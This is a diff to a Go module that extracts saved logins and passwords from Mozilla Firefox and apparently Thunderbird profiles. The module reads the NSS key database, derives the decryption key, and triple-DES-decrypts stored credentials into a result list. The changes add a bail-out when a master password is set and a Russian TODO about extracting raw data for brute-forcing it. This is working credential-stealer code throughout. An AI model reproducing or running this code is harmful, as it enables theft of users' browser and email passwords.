@@ -158,12 +158,14 @@ func mozillaIsMasterPasswordCorrect(item1, item2 string) (string, string, string
 }
 
 //Key data - item1, item2
-func mozillaManageMasterPassword(item1, item2 string) (string, string, string){
+func mozillaManageMasterPassword(item1, item2 string) (string, string, string, bool){
 	var globalSalt, masterPassword, entrySalt = mozillaIsMasterPasswordCorrect(item1, item2)
 	if globalSalt == "" {
-		log.Println("Master password is used") //TODO Сделать извлечение "сырых" данных для перебора
+		//log.Println("Master password is used") //TODO Сделать извлечение "сырых" данных для перебора
+		//TODO Вставить вывод ошибок
+		return "", "", "", false
 	}
-	return globalSalt, masterPassword, entrySalt
+	return globalSalt, masterPassword, entrySalt, true
 }
 
 func mozillaGetLongBE(header []byte, offset int) uint32{
@@ -267,6 +269,18 @@ type AsnPrivKeyBSDDB struct{
 	OtherData asn1.RawValue
 }
 
+type NudeBytesAsnKeyBSDDB struct {
+	P1 int
+	Keyid int
+	P3 int
+	Key asn1.RawValue
+	P5 int
+	P6 int
+	P7 int
+	P8 int
+	P9 int
+}
+
 func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, masterPassword string) []byte{
 	var(
 		name, _ = hex.DecodeString("f8000000000000000000000000000001")
@@ -274,7 +288,7 @@ func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, maste
 		saltLen = int(privKeyEntry[1])
 		nameLen = int(privKeyEntry[2])
 		privKeyEntryASN1 AsnSecretKeyBSDDB
-		)
+	)
 	asn1.Unmarshal([]byte(privKeyEntry[3+saltLen+nameLen:]), &privKeyEntryASN1)
 
 	var(
@@ -287,11 +301,19 @@ func mozillaExtractSecretKey(keyData map[string]string, globalSalt string, maste
 	asn1.Unmarshal(privKey, &PrivKeyRaw)
 
 	var (
-		nudeBytes       = string(PrivKeyRaw.OtherData.Bytes)       // Эта хрень не хотела нормально читаться в структуру.
-		allDataFromAsn1 = strings.Split(nudeBytes, string("\x02")) // TODO КОСТЫЛЬ
-		key             = []byte(allDataFromAsn1[4][1:])
+		nudeBytes        = string(PrivKeyRaw.OtherData.Bytes)       // Эта хрень не хотела нормально читаться в структуру.
+		allDataFromAsn1  = strings.Split(nudeBytes, string("\x02")) // TODO КОСТЫЛЬ
+		key              = []byte(allDataFromAsn1[4][1:])
 	)
-
+	/*
+	Ну не читается она нормально. Почему? А хрен его знает, всё по нулям.
+	Вроде по namespace проблем нет, саму структуру asn1 правильно распарсил
+	var KeyStruct NudeBytesAsnKeyBSDDB
+	asn1.Unmarshal(PrivKeyRaw.OtherData.Bytes, &KeyStruct)
+	log.Println(base64.StdEncoding.EncodeToString([]byte(PrivKeyRaw.OtherData.Bytes)))
+	log.Printf("%x\n", KeyStruct.Key.FullBytes)
+	log.Printf("%x\n", key)
+	*/
 	return key
 }
 
@@ -306,7 +328,12 @@ func getMozillaKey(profilePath string, app string) []byte{
 
 		for rows.Next(){
 			rows.Scan(&item1, &item2)
-			var globalSalt, _, _ = mozillaManageMasterPassword(item1, item2)
+			var globalSalt, _, _, status = mozillaManageMasterPassword(item1, item2)
+
+			if !status {
+				// Сработает в случае использования master password для FF
+				return nil
+			}
 
 			if globalSalt != ""{
 				rows2, _ := db.Query("SELECT a11,a102 FROM nssPrivate")
@@ -396,7 +423,7 @@ func mozillaModuleStart(data AppInfo) ([]common.CredentialsData, bool){
 			if len(credentials) == 0 || len(key)==0 || key == nil{
 				return nil, false
 			}
-			var data []common.CredentialsData
+			var credentialsData []common.CredentialsData
 			for j := range credentials{
 				var (
 					loginWithTrash    = tripleDesDecrypt(credentials[j].userName.cipherText, key, credentials[j].userName.Iv)
@@ -411,18 +438,20 @@ func mozillaModuleStart(data AppInfo) ([]common.CredentialsData, bool){
 					login = string(loginWithTrash[:loginLength-int(loginWithTrash[loginLength-1])])
 					password = string(passwordWithTrash[:passwordLength-int(passwordWithTrash[passwordLength-1])])
 				)
-				//data = append(data, fmt.Sprintf("%s %s %s", credentials[j].hostname, login, password))
-				data = append(data, common.CredentialsData{credentials[j].hostname, login, password})
+				if data.name == "TB"{
+					credentials[j].hostname="mail"
+				}
+				credentialsData = append(credentialsData, common.CredentialsData{credentials[j].hostname, login, password})
 			}
-			return data, true
+			return credentialsData, true
 		}
 	}
 	return nil, false
 }
 
-func MozillaExtractDataRun() common.ExtractDataResult{
-	var Result common.ExtractDataResult
-	var EmptyResult = common.ExtractDataResult{false,Result.Data}
+func MozillaExtractDataRun() common.ExtractCredentialsResult {
+	var Result common.ExtractCredentialsResult
+	var EmptyResult = common.ExtractCredentialsResult{false,Result.Data}
 
 	for i:=range mozillaPathsUserData {
 		if _, err := os.Stat(mozillaPathsUserData[i].path); err == nil {
